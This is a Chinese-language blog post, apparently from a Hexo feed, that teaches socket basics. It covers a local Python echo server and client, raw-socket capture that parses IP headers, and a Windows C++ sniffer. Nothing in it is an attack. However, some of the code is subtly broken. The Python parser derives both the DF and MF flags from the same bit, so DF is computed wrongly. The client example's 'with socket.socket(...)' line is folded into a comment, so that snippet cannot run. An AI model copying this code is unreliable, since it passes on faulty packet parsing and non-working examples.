class="number">0</span>)</span><br></pre></td></tr></table></figure><p>但这样的实现其实是抓取到了很多信息，通过设定prn对抓取到的信息进行处理提取出我们想要的。那如何才能对IP包进行直接抓取，这就需要用到socket了。</p><h5 id="以下是本人对socket的理解，并不确保完全正确。"><a href="#以下是本人对socket的理解，并不确保完全正确。" class="headerlink" title="以下是本人对socket的理解，并不确保完全正确。"></a>以下是本人对socket的理解，并不确保完全正确。</h5><h3 id="何为socket"><a href="#何为socket" class="headerlink" title="何为socket"></a>何为socket</h3><blockquote><p>A <strong>network socket</strong> is a software structure within a network node of a computer network that serves as an endpoint for sending and receiving data across the network.      ——<a href="https://en.wikipedia.org/wiki/Network_socket">Wikipedia</a></p></blockquote><p>前半句话难以理解甚至于比较抽象，但后半句其实说明了Socket即<strong>端</strong>，<strong>端作为网络通信的起点或者终点而存在</strong>。基于socket去获取信息，我们可以不用了解链路中间发生了什么，信息是如何传输的，但我们知道通过socket就是可以得到信息。它就像是API调用就好，可以输出我们想要的，而不必关注它中间做了多复杂的操作。</p><p>调用API你需要去传入参数，socket可以说是操作系统提供的一套API。因此创建socket也要向操作系统提交需要创建的socket的信息，然后才能创建一个对应的socket。</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/1.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">socket抽象层</div> </center><h4 id="socket的结构"><a href="#socket的结构" class="headerlink" title="socket的结构"></a>socket的结构</h4><p>一个socket至少包含以下内容</p><ol><li>本地socket地址：本地主机的ip+端口号。</li><li>传输协议：例如TCP、UDP、raw IP等。</li></ol><p>如果本地socket要与远程主机进行通信，则还有加上远程socket的地址，即远程主机的ip与端口号。</p><p>就如同两个人之间用手机进行通信，手机就是socket，它包含电话号码(即本地socket地址)，手机的通信协议(即传输协议)，如果要打电话，那需要对方的电话号码(即远程主机的socket地址)。类比到计算机网络环境，主机就如同人，socket就如同手机。我们并不需要知道拨打电话后发生了什么，我们只知道我们之间的通信建立成功了。</p><p>以上便是对socket的比喻描述，但可能并不是很恰当，因为socket创建中本地的socket地址是其固有属性，而电话号码是手机的一个附加属性。</p><h4 id="socket的用法"><a href="#socket的用法" class="headerlink" title="socket的用法"></a>socket的用法</h4><p>当我们已经创建好socket之后，我们需要一些操作对socket进行配置，bind,listen,connect…</p><p>还是手机的例子，有了手机(有了socket)，首先要再本机的多个号码中配置要用的一个(为socket关联本地地址，bind)，要打电话就要输电话号码(与远程socket建立连接,connect)，接电话(accept)。</p><h3 id="socket的python实现"><a href="#socket的python实现" class="headerlink" title="socket的python实现"></a>socket的python实现</h3><p>所以我们的目的其实就是创建socket，然后根据要求使用socket</p><h4 id="创建socket"><a href="#创建socket" class="headerlink" title="创建socket"></a>创建socket</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">socket.socket(family&#x3D;AF_INET, type&#x3D;SOCK_STREAM, proto&#x3D;0, fileno&#x3D;None)</span><br></pre></td></tr></table></figure><ul><li><code>family</code>-用于指定socket的地址类型。常见由<code>AF-INET</code>和<code>AF-INET6</code>,分别表示IPv4和IPv6，AF即<code>Address Family</code>。</li><li><code>type</code>-用于指定socket类型。主要有以下类型<ol><li><code>SOCK_STREAM</code>：使用TCP或STCP协议，面向连接的socket</li><li><code>SOCK_DGRAM</code>：使用UDP协议，面向无连接的socket</li><li><code>SOCK_RAW</code>：原始套接字。这类socket，数据包将绕过运输层，因此可以在应用层得到数据包的头部</li></ol></li><li><code>proto</code>-协议号通常为零,可以省略。这相当于为指定协议在运输层打开一个缺口，从而在运输层放行该协议的包。IPPROTO_TCP 、 IPPROTO_IP 、IPPROTO_UDP代表三种不同的协议，分别代表IP协议族里面的TCP协议、IP协议和UDP协议。</li><li><code>fileno</code>-如果指定了fileno,则其他参数将被忽略,导致带有指定文件描述符的套接字返回。</li></ul><h4 id="使用socket"><a href="#使用socket" class="headerlink" title="使用socket"></a>使用socket</h4><p>关于socket的使用，按使用协议的不同可以分为TCP通信和UDP通信，按使用场景不同，又可以分为客户端与服务器端。</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/3.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">基于TCP的socket通讯流程图</div> </center><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/4.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">基于UDP的socket通讯流程图</div> </center><h4 id="socket基本函数"><a href="#socket基本函数" class="headerlink" title="socket基本函数"></a>socket基本函数</h4><ul><li><code>socket.bind(adress)</code> - 该函数将socket绑定到一个地址上，为socket关联一个相应的IP和端口号。要注意2点：1. 一个socket只能绑定到一个地址上，不能重复绑定；2. 地址格式必须与创建socket时指定的一致，例如不能将INET socket绑定到INET6 socket上</li><li><code>socket.listen([backlog])</code> - 启动监听，即允许服务器接受连接。backlog参数用于指定最大连接数，一旦服务器达到最大连接数，之后的连接都将被拒绝。backlog参数的大小，决定了TCP服务器的连接请求队列大小，进一步影响客户端连接请求的成功与否。</li><li><code>socket.connect(address)</code> - 与远程socket建立连接。只有使用TCP才需要建立连接，UDP是无连接的。</li><li><code>socket.accept()</code> - 接受一个连接。其返回值是<code>(conn, address)</code>，其中conn是是一个新的socket对象，用于与建立连接的socket收发数据，address则作为远程socket地址绑定到该socket上。原始socket与主机的一个端口绑定，但并不意味着socket占用了该端口，而是向TCP\IP协议栈声明了其对80端口的占用。新创建的socket使用的端口是不变的，这并不意味着端口占用。而是因为<strong>socket只是对TCP/IP协议栈操作的抽象，而不是简单的映射关系</strong>。</li><li><code>socket.send(bytes)</code>/<code>socket.sendto(bytes[,flags], address)</code> - 向远程socket发送数据，注意，必须以bytes格式发送。而使用<code>sendto</code>时，要指名目的socket的地址。</li><li><code>socket.recv(bufsize[, flags])</code>/<code>socket.recvfrom(bufsize[, flags])</code> - 从socket接收数据，通过<code>bufsize</code>指定一次性接收数据的最大量，<code>recv</code>的返回值是bytes对象，而<code>recvfrom</code>的返回值是<code>(data, address)</code>，address即为发送数据的socket地址。</li></ul><h4 id="socket实现服务器端与客户端通信"><a href="#socket实现服务器端与客户端通信" class="headerlink" title="socket实现服务器端与客户端通信"></a>socket实现服务器端与客户端通信</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 服务器端</span><br><span class="line">import socket</span><br><span class="line"># 创建socket</span><br><span class="line">with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</span><br><span class="line">    s.bind((&quot;127.0.0.1&quot;, 56789))  # 绑定地址，如前所述，socket地址由ip地址与port组成</span><br><span class="line">    s.listen(1)  # 启动监听，并设置最大连接数为1</span><br><span class="line">    conn, addr &#x3D; s.accept()  # 接受连接，并将返回的新socket与addr info分别储存</span><br><span class="line">    with conn:</span><br><span class="line">        print(&#39;Connected by&#39;, addr)  # 在本地打印信息，测试用</span><br><span class="line">        while True:</span><br><span class="line">            data &#x3D; conn.recv(65565)  # 65535是一次性能接收的最大值</span><br><span class="line">            if not data:</span><br><span class="line">                break</span><br><span class="line">            conn.send(data)  # 将数据原样发回</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">#客户端</span><br><span class="line">import socket</span><br><span class="line"># 创建socket with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</span><br><span class="line">    s.connect((&quot;127.0.0.1&quot;, 56789))  # 连接到另一个socket     </span><br><span class="line">    s.send(b&#39;Hello, socket&#39;)  # 向对方socket发送数据     </span><br><span class="line">    data &#x3D; s.recv(65565)</span><br><span class="line">print(&#39;Received&#39;, str(data))  # 打印收到的数据 </span><br></pre></td></tr></table></figure><p>以上代码实现了在本机范围内的通信，修改IP为远程服务器IP即可与远程服务器建立连接。</p><h3 id="Package-analyse"><a href="#Package-analyse" class="headerlink" title="Package analyse"></a>Package analyse</h3><p>在此我们需要为设置socket的类型为原始套接字，并为其指定协议IPPROTO_TCP表明要抓取TCP协议报文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#demo</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line">    while True:</span><br><span class="line">        print(s.recvfrom(65565))</span><br></pre></td></tr></table></figure><p>recvfrom返回data和address。data部分由<code>IP header + TCP header + data</code>组成，于是我们基于对socket的理解，便可以着手去用socket抓取IP报文，并对IP报文报头进行分析。</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/5.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">IP数据包格式</div> </center><p>通过如下处理便可以得到IP报文首部的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>():</span></span><br><span class="line">    s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        raw_packet = s.recvfrom(<span class="number">65565</span>)</span><br><span class="line">        packet = raw_packet[<span class="number">0</span>]</span><br><span class="line">        raw_iph = packet[<span class="number">0</span>:<span class="number">20</span>]</span><br><span class="line">        <span class="comment"># unpack(fmt, buffer) - 根据指定的格式化字符串来拆解给定的buffer</span></span><br><span class="line">        <span class="comment"># B 单字节的整型</span></span><br><span class="line">        <span class="comment"># H 双字节的整型</span></span><br><span class="line">        <span class="comment"># s bytes，前加数字表示取4字节的bytes</span></span><br><span class="line">        iph = unpack(<span class="string">&quot;!BBHHHBBH4s4s&quot;</span>, raw_iph)</span><br><span class="line">        fields = &#123;&#125;</span><br><span class="line">        fields[<span class="string">&quot;Version&quot;</span>] = iph[<span class="number">0</span>] &gt;&gt; <span class="number">4</span>    <span class="comment"># 版本字段与IP数据报头部共享一个字节，通过右移操作取得单独的版本字段</span></span><br><span class="line">        fields[<span class="string">&quot;IP Header Length&quot;</span>] = (iph[<span class="number">0</span>] &amp; <span class="number">0xF</span>) * <span class="number">4</span>    <span class="comment"># 首部长度字段的1代表4个字节</span></span><br><span class="line">        fields[<span class="string">&quot;Type of Service&quot;</span>] = iph[<span class="number">1</span>]    <span class="comment"># 区分服务，一般情况下并不使用</span></span><br><span class="line">        fields[<span class="string">&quot;Total Length&quot;</span>] = iph[<span class="number">2</span>]    <span class="comment"># IP首部+数据的总长度，即len(packet)</span></span><br><span class="line">        fields[<span class="string">&quot;Identification&quot;</span>] = iph[<span class="number">3</span>]    <span class="comment"># 标识</span></span><br><span class="line">        flags = iph[<span class="number">4</span>] &gt;&gt; <span class="number">13</span>    <span class="comment"># 标识位与片偏移共享2个字节，且最高位并且未使用</span></span><br><span class="line">        fields[<span class="string">&quot;MF&quot;</span>] = <span class="number">1</span> <span class="keyword">if</span> flags &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>    <span class="comment"># 测试最低位</span></span><br><span class="line">        fields[<span class="string">&quot;DF&quot;</span>] = <span class="number">1</span> <span class="keyword">if</span> flags &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>    <span class="comment"># 测试中间位</span></span><br><span class="line">        fields[<span class="string">&quot;Fragment Offset&quot;</span>] = iph[<span class="number">4</span>] &amp; <span class="number">0x1FFF</span>    <span class="comment"># 位与操作取得片偏移</span></span><br><span class="line">        fields[<span class="string">&quot;Time to Live&quot;</span>] = iph[<span class="number">5</span>]    <span class="comment"># 生存时间，单位是跳数</span></span><br><span class="line">        fields[<span class="string">&quot;Protocol&quot;</span>] = iph[<span class="number">6</span>]    <span class="comment"># 数据报携带的数据使用的协议，TCP为6</span></span><br><span class="line">        fields[<span class="string">&quot;Header Checksum&quot;</span>] = iph[<span class="number">7</span>]    <span class="comment"># 首部校验和</span></span><br><span class="line">        <span class="comment"># socket.inet_ntoa(..)</span></span><br><span class="line">        <span class="comment"># - convert an ip address from 32-bit packed binary format to string format</span></span><br><span class="line">        fields[<span class="string">&quot;Source Address&quot;</span>] = socket.inet_ntoa(iph[<span class="number">8</span>])</span><br><span class="line">        fields[<span class="string">&quot;Destination Address&quot;</span>] = socket.inet_ntoa(iph[<span class="number">9</span>])</span><br></pre></td></tr></table></figure><p>通过上述代码的解析我们可以获取到IP首部，同理我们也可以去解析TCP首部。</p><p>我们为其指定协议为IPPROTO_TCP，可以获取TCP报文，但如果采用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))</span><br></pre></td></tr></table></figure><p>来创建socket，便可以获取信息更全面的数据包，<code>ethernet frame header + IP header+ inner-Protocol header+data</code>。再对各个部分进行切片操作，根据报文格式进行提取，就可以实现对本机所有以太网帧的捕获与分析了！</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/6.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">数据报格式</div> </center><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>为了实现socket编程，起初尝试用C++完成任务，学习网上的代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mstcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;IP_HEAD.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> number;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DecodeIP</span><span class="params">(<span class="keyword">char</span>* buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = len;</span><br><span class="line">    <span class="keyword">if</span> (n &gt;= <span class="keyword">sizeof</span>(IP_HEAD))</span><br><span class="line">    &#123;</span><br><span class="line">        IP_HEAD iphead;</span><br><span class="line">        iphead = *(IP_HEAD*)buf;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;第 &quot;</span> &lt;&lt; number++ &lt;&lt; <span class="string">&quot; 个IP数据包信息：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;协议版本:&quot;</span> &lt;&lt; (iphead.ver_hlen &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;总长度:&quot;</span> &lt;&lt; ntohs(iphead.wPacketLen) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//网络字节序转为主机字节序</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;标志位:&quot;</span> &lt;&lt; <span class="string">&quot;DF=&quot;</span> &lt;&lt; ((iphead.Flags &gt;&gt; <span class="number">14</span>) &amp; <span class="number">0x01</span>) &lt;&lt; <span class="string">&quot;,MF=&quot;</span> &lt;&lt; ((iphead.Flags &gt;&gt; <span class="number">13</span>) &amp; <span class="number">0x01</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;片偏移:&quot;</span> &lt;&lt; (iphead.FragOf &amp; <span class="number">0x1fff</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;协议:&quot;</span> &lt;&lt; <span class="keyword">int</span>(iphead.byProtocolType) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;源地址:&quot;</span> &lt;&lt; inet_ntoa(*(in_addr*)&amp;iphead.dwIPSrc) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;目的地址:&quot;</span> &lt;&lt; inet_ntoa(*(in_addr*)&amp;iphead.dwIPDes) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;---------------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AutoWSACleanup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ::WSACleanup();  <span class="comment">// 终止Winsock的使用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    WSADATA wd;  <span class="comment">//一种数据结构,这个结构被用来存储被WSAStartup函数调用后返回的Windows Sockets数据,它包含Winsock.dll执行的数据。</span></span><br><span class="line">    n = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wd);  <span class="comment">//返回winsock服务初始化是否成功，若返回1则输出错误</span></span><br><span class="line">    <span class="keyword">if</span> (n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;WSAStartup函数错误！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    atexit(AutoWSACleanup);</span><br><span class="line">    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);  <span class="comment">//创建SOCKET</span></span><br><span class="line">    <span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cerr</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取本机地址</span></span><br><span class="line">    <span class="keyword">char</span>  name[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == gethostname(name, <span class="keyword">sizeof</span>(name)))</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>* <span class="title">pHostent</span>;</span></span><br><span class="line">    pHostent = gethostbyname(name);</span><br><span class="line">    <span class="comment">//绑定本地地址到SOCKET</span></span><br><span class="line">    sockaddr_in addr;</span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_addr = *(in_addr*)pHostent-&gt;h_addr_list[<span class="number">0</span>]; <span class="comment">//IP</span></span><br><span class="line">    addr.sin_port = <span class="number">8888</span>; <span class="comment">//端口，IP层端口可随意填</span></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == bind(sock, (sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)))</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置该SOCKET为接收所有流经绑定的IP的网卡的所有数据，包括接收和发送的数据包</span></span><br><span class="line">    u_long sioarg = <span class="number">1</span>;</span><br><span class="line">    DWORD wt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == WSAIoctl(sock, SIO_RCVALL, &amp;sioarg, <span class="keyword">sizeof</span>(sioarg), <span class="literal">NULL</span>, <span class="number">0</span>, &amp;wt, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//我们只需要接收数据，因此设置为阻塞IO，使用最简单的IO模型</span></span><br><span class="line">    u_long bioarg = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == ioctlsocket(sock, FIONBIO, &amp;bioarg))</span><br><span class="line">    &#123;</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; WSAGetLastError();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//开始接收数据</span></span><br><span class="line">    <span class="comment">//因为前面已经设置为阻塞IO，recv在接收到数据前不会返回。</span></span><br><span class="line">    number = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">65535</span>];</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        len = recv(sock, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (len &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            DecodeIP(buf, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (len &gt; <span class="number">0</span>);</span><br><span class="line">    closesocket(sock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后来尝试用Python的socket模块进行编程，但是socket在Windows环境下不时出现Winerror，windows下基于python的socket编程资料也比较少，很难以解决，最后转向Linux。我推测原因在于Windows下对于socket的操作函数已经传入的参数设置可能于Linux存在不同，因而产生报错。在虚拟机Ubuntu20.04的开发环境完成程序的编写以及界面的编写。</p><p>关于软件的代码见<a href="https://github.com/gorgeousdays/Package-analyse。存在诸多bug，由于在windows环境下测试不了，在Ubuntu虚拟机下测试性能太差，很难对代码进行Debug。">https://github.com/gorgeousdays/Package-analyse。存在诸多bug，由于在windows环境下测试不了，在Ubuntu虚拟机下测试性能太差，很难对代码进行Debug。</a></p><p>目前问题：</p><ol><li>只能抓包一次，即需要对socket的创建进行控制。</li><li>关于过滤器的编写，实现对抓取到的报文的过滤操作</li><li>优化问题，实现对TCP首部的分析，实现对所有报文的抓取分析以及过滤。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/charlesblc/p/6235437.html">https://www.cnblogs.com/charlesblc/p/6235437.html</a></p><p><a href="https://www.cnblogs.com/riacool/archive/2010/12/14/1905404.html">https://www.cnblogs.com/riacool/archive/2010/12/14/1905404.html</a></p><p><a href="https://www.cnblogs.com/yunya-cnblogs/p/13198409.html">https://www.cnblogs.com/yunya-cnblogs/p/13198409.html</a></p><p><a href="https://www.youtube.com/watch?v=r59LJARW8hU">https://www.youtube.com/watch?v=r59LJARW8hU</a></p><p><a href="https://blog.kissg.me">https://blog.kissg.me</a></p><p><a href="https://realpython.com/python-sockets/">https://realpython.com/python-sockets/</a></p><p><a href="http://www.steves-internet-guide.com/tcpip-ports-sockets/#comment-1821">http://www.steves-internet-guide.com/tcpip-ports-sockets/#comment-1821</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020总结</title>
      <link href="/2021/01/01/2020%E6%80%BB%E7%BB%93/"/>
      <url>/2021/01/01/2020%E6%80%BB%E7%BB%93/</url>
      
